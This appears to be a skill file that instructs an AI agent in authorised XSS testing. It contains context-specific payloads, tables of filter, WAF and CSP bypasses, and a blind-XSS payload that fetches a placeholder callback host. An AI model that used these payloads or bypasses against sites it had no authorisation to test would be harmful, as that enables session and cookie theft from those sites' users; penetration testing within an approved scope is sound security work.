---
name: harness-xss
description: "Test reflected, stored, DOM and blind XSS with context-aware payloads, WAF bypass, and OOB confirmation. One injection point per attempt, one context per payload."
---

# XSS deep — context-aware, OOB-confirmed

Source: `testing-for-xss`, `dom-based-xss`, `waf-bypass-xss` (2024: mutation XSS, DOM clobbering, Trusted Types bypass).

## Gate

Approved `host+parameter+injection point` only. Every command via `cyber_process` `argv`. One parameter, one context, one payload per request. No credential theft, no session hijack — canary callback only. → `harness-vuln-triage` before `cyber_finding`.

## Steps

### 1. Context detection (mandatory before any payload)

Inject a benign canary (`XSSCANARY<random8>`) in the target parameter. Read the response and classify where the canary lands:

| Context | Canary appears in… | Breakout strategy |
|---|---|---|
| HTML body | `<div>CANARY</div>` | `<img src=x onerror=…>`, `<svg/onload=…>` |
| HTML attribute (unquoted) | `<input value=CANARY` | `autofocus onfocus=…` |
| HTML attribute (single) | `<input value='CANARY'` | `' onfocus=… '` |
| HTML attribute (double) | `<input value="CANARY"` | `" onfocus=… "` |
| HTML attribute (href/src) | `<a href="CANARY"` | `javascript:…`, `data:text/html,…` |
| JS string (single) | `var x='CANARY'` | `'-alert(1)-'`, `</script><script>…` |
| JS string (double) | `var x="CANARY"` | `"-alert(1)-"` |
| JS template literal | `` var x=`CANARY` `` | `${alert(1)}` |
| Inside `<script>` block | `if(CANARY)` | Direct JS: `};alert(1)//` |
| CSS value | `color: CANARY` | `expression()`, `url()` (IE), `-moz-binding` |
| URL parameter reflection | `?q=CANARY` in `<meta>` | `"><script>…` or `javascript:` |
| JSON response | `{"key":"CANARY"}` | `</script>` injection, prototype pollution |
| AngularJS template | `{{CANARY}}` | `{{constructor.constructor('alert(1)')()}}` |
| Vue/React dangerouslySetInnerHTML | Component prop | Framework-specific escape |

Record context as its own observation. **Never send a payload without knowing the context.**

### 2. Filter and encoding analysis

Before the attack payload, probe what is filtered:
- Send `<>"'/(){}` individually → record which are encoded, stripped, or passed.
- Send `<script>`, `<img>`, `onerror` → record tag/event filtering.
- Send `CANARY<br>CANARY` → check if HTML is rendered.
- Record each probe as an observation.

Build the bypass map:
| Filter | Bypass candidates |
|---|---|
| `<script>` blocked | `<img>`, `<svg>`, `<details/open/ontoggle>`, `<body/onload>` |
| `on*` events blocked | `<a href=javascript:…>`, `<iframe srcdoc=…>`, `<math>` |
| `()` blocked | `` ``.constructor.constructor`alert\x281\x29` ``, `onerror=alert&lpar;1&rpar;` |
| Case-sensitive filter | `<ScRiPt>`, `<IMG SRC=x ONERROR=…>` |
| Double-encoding | `%253C` → `<` after server decodes twice |
| WAF (Cloudflare/Akamai) | Chunked encoding, `\t\n` in tags, Unicode normalization, null bytes |
| CSP `script-src` | JSONP callback on whitelisted origin, `base-uri` hijack, `object-src` |
| Trusted Types | Policy bypass via `default` policy, `createHTML` sink |

### 3. Payload delivery (one per attempt)

For each context, craft ONE payload:
- Reflected: inject → response → check for execution marker.
- Stored: inject → navigate to render page → check for execution marker.
- DOM: inject via `location.hash`/`postMessage`/`document.referrer` → check DOM sink.
- Blind: inject → OOB callback (webhook.site, Burp Collaborator, interactsh) → wait for hit.

Execution marker = OOB callback with correlation ID, **not** visual observation alone.
```
<img src=x onerror="fetch('https://CALLBACK/xss-'+btoa(document.domain))">
```

### 4. DOM XSS specific

If source analysis (harness-source-deep) identified DOM sinks:
1. Trace the taint: source (`location.hash`, `postMessage`, `document.cookie`, `localStorage`) → sink (`innerHTML`, `outerHTML`, `document.write`, `eval`, `Function`, `setTimeout(string)`, `insertAdjacentHTML`, `jQuery.html()`).
2. Check for sanitizers in the path (DOMPurify, sanitize-html, framework escaping).
3. If no sanitizer or bypassable: craft payload for the specific sink.
4. `cyber_capture` the DOM state showing the injected node.

### 5. Negative controls

For each confirmed payload:
- Control 1: same parameter, benign value → no callback = negative control.
- Control 2: same payload, different parameter not reflected → no callback.
- Control 3: syntactically broken payload (e.g., `<img src=x onerr=…>`) → no callback.

### 6. Evidence assembly

`cyber_finding` with:
- `evidence`: canary context observation + filter probe + payload observation + OOB callback + reproduction + all 3 negative controls
- `sources`: the response chunk showing the unescaped payload in context
- `checks`: context:positive-control, payload:reproduction, benign-value:negative-control, broken-syntax:negative-control, callback:contains correlation ID
- `impact`: cookie theft feasibility (HttpOnly?), session hijack (SameSite?), stored vs reflected scope

### WAF bypass protocol

If initial payloads are blocked:
1. Identify the WAF (response headers, body patterns, `wafw00f`).
2. Try encoding mutations: HTML entities, URL encoding, Unicode, null bytes.
3. Try tag mutations: uncommon tags (`<details>`, `<math>`, `<foreignObject>`), SVG.
4. Try event mutations: lesser-known events (`ontoggle`, `onpointerenter`, `onfocusin`).
5. Try delivery mutations: chunked encoding, multipart, `Transfer-Encoding` tricks.
6. Record each bypass attempt as its own observation — a WAF block is data, not failure.

## Proof contract

A finding needs: (1) identified injection context, (2) filter/encoding map, (3) executed payload with OOB confirmation or DOM capture, (4) reproduction with fresh correlation ID, (5) three negative controls. A reflected canary alone is a lead, not a finding.

## Done

Each XSS cites the injection context, the filter bypass, the execution proof (OOB or DOM capture), and the negative controls. `200` with reflected input is never enough.
